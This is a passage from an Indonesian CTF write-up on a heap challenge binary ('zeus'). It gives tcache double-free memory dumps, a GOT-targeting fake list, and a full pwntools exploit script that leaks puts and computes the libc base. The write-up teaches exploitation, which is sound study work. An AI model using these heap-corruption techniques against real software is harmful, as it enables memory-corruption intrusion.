&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;delete(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;B&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;)

&lt;span style=&#34;color:#75715e&#34;&gt;# (0x30)   tcache_entry[1]: 0x1bab350&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 0x1bab290:      0x0000000000000000      0x0000000000000021&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 0x1bab2a0:      0x4141414141414141      0x0000000000000000&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 0x1bab2b0:      0x0000000000000000      0x0000000000000021&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 0x1bab2c0:      0x6161616161616161      0x0000000000000000&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 0x1bab2d0:      0x0000000000000000      0x0000000000000031&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 0x1bab2e0:      0x0000000800000008      0x0000000001bab2a0&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 0x1bab2f0:      0x0000000001bab2c0      0x0000000001bab350&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 0x1bab300:      0x0000000000000000      0x0000000000000021&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 0x1bab310:      0x4242424242424242      0x0000000000000000&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 0x1bab320:      0x0000000000000000      0x0000000000000021&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 0x1bab330:      0x6262626262626262      0x0000000000000000&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 0x1bab340:      0x0000000000000000      0x0000000000000031&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 0x1bab350:      0x0000000000000000      0x0000000001bab310&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 0x1bab360:      0x0000000001bab330      0x0000000000000000&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 0x1bab370:      0x0000000000000000      0x000000000001fc91&lt;/span&gt;

delete(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;A&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;)

&lt;span style=&#34;color:#75715e&#34;&gt;# (0x30)   tcache_entry[1]: 0x1bab2e0 --&amp;gt; 0x1bab350&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 0x1bab290:      0x0000000000000000      0x0000000000000021&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 0x1bab2a0:      0x4141414141414141      0x0000000000000000&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 0x1bab2b0:      0x0000000000000000      0x0000000000000021&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 0x1bab2c0:      0x6161616161616161      0x0000000000000000&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 0x1bab2d0:      0x0000000000000000      0x0000000000000031&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 0x1bab2e0:      0x0000000001bab350      0x0000000001bab2a0 &lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;#                      ^----------------- tcache_entry&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 0x1bab2f0:      0x0000000001bab2c0      0x0000000001bab350&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 0x1bab300:      0x0000000000000000      0x0000000000000021&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 0x1bab310:      0x4242424242424242      0x0000000000000000&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 0x1bab320:      0x0000000000000000      0x0000000000000021&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 0x1bab330:      0x6262626262626262      0x0000000000000000&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 0x1bab340:      0x0000000000000000      0x0000000000000031&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 0x1bab350:      0x0000000000000000      0x0000000001bab310&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 0x1bab360:      0x0000000001bab330      0x0000000000000000&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 0x1bab370:      0x0000000000000000      0x000000000001fc91&lt;/span&gt;

delete(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;B&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;)
&lt;span style=&#34;color:#75715e&#34;&gt;# (0x30)   tcache_entry[1]: 0x1bab350 --&amp;gt; 0x1bab2e0 --&amp;gt; 0x1bab350 (overlap chunk with 0x1bab340(freed) ) !!!&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 0x1bab290:      0x0000000000000000      0x0000000000000021&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 0x1bab2a0:      0x4141414141414141      0x0000000000000000&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 0x1bab2b0:      0x0000000000000000      0x0000000000000021&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 0x1bab2c0:      0x6161616161616161      0x0000000000000000&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 0x1bab2d0:      0x0000000000000000      0x0000000000000031&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 0x1bab2e0:      0x0000000001bab350      0x0000000001bab2a0&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;#                      ^----------------- tcache_entry&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 0x1bab2f0:      0x0000000001bab2c0      0x0000000001bab350&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 0x1bab300:      0x0000000000000000      0x0000000000000021&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 0x1bab310:      0x4242424242424242      0x0000000000000000&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 0x1bab320:      0x0000000000000000      0x0000000000000021&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 0x1bab330:      0x6262626262626262      0x0000000000000000&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 0x1bab340:      0x0000000000000000      0x0000000000000031&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 0x1bab350:      0x0000000001bab2e0      0x0000000001bab310&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;#                      ^----------------- tcache_entry&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 0x1bab360:      0x0000000001bab330      0x0000000000000000&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 0x1bab370:      0x0000000000000000      0x000000000001fc91&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Dengan begitu payload sebelumnya untuk leak hanya perlu diubah sedikit untuk mengotrol tcache_entry ke got,&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;fake_list &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x602078&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;# tcache_entries -&amp;gt; got&lt;/span&gt;
fake_list &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x00400505&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;# key : str.malloc&lt;/span&gt;
fake_list &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x602020&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;# value : reloc.puts&lt;/span&gt;
fake_list &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;# next&lt;/span&gt;

insert(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;A&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;, fake_list)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;tepat setelah beberapa kali malloc di fastbin[1], malloc akan return pointer di got.&lt;/p&gt;
&lt;h2 id=&#34;full-exploit&#34;&gt;full-exploit&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#!/usr/bin/env python&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; pwn &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; sys&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; os

gdbcmd &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;b *0x004011ca&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;

context&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;terminal &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;kitty @ new-window --new-tab --tab-title pwn --keep-focus sh -c&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;split()
&lt;span style=&#34;color:#75715e&#34;&gt;# context.log_level = &amp;#39;warn&amp;#39;&lt;/span&gt;


&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;argv&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;__len__() &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;:
    r &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; remote(sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;argv[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;], int(sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;argv[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;]))
    libc &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ELF(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;./libc-2.28-9dc614ec33ee0284064ec5535bda431c.so&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;, checksec&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;False)
&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
    &lt;span style=&#34;color:#75715e&#34;&gt;# r = process(&amp;#39;/home/vagrant/ctf/cj/p11-zeus/zeus&amp;#39;, aslr=False, env={&amp;#39;LD_PRELOAD&amp;#39;:&amp;#39;./libc-2.28-9dc614ec33ee0284064ec5535bda431c.so&amp;#39;})&lt;/span&gt;
    &lt;span style=&#34;color:#75715e&#34;&gt;# r = process(&amp;#39;/home/vagrant/ctf/cj/p11-zeus/zeus&amp;#39;, aslr=False)&lt;/span&gt;
    r &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; process(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;/home/vagrant/ctf/cj/p11-zeus/zeus&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
    libc &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ELF(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;/lib/x86_64-linux-gnu/libc.so.6&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;, checksec&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;False)
    gdb&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;attach(r, gdbcmd)

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;insert&lt;/span&gt;(key, val):
    r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
    r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;, len(key)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;__str__())
    r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;, key)
    r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;, len(val)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;__str__())
    r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;, val)
    r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvline(False)
    log&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;info(r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvline(False))

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;delete&lt;/span&gt;(key):
    r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
    r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;, key)
    log&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;info(r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvline(False))

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;lookup&lt;/span&gt;(key):
    r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;3&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
    r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;, key)
    r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvline(False)

insert(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;A&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;a&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;)
insert(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;B&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;)

delete(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;B&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;)
delete(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;A&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;)
delete(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;B&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;)

fake_list &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x602078&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;# tcache_entries -&amp;gt; got&lt;/span&gt;
fake_list &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x00400505&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;# key : str.malloc&lt;/span&gt;
fake_list &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x602020&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;# value : reloc.puts&lt;/span&gt;
fake_list &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;# next&lt;/span&gt;

insert(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;A&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;, fake_list)

puts &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; u64(lookup(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;malloc&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ljust(&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;))
libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;address &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; puts &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;symbols[&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;puts&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;]
log&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;info(hex(libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;address))

insert(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;B&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;)

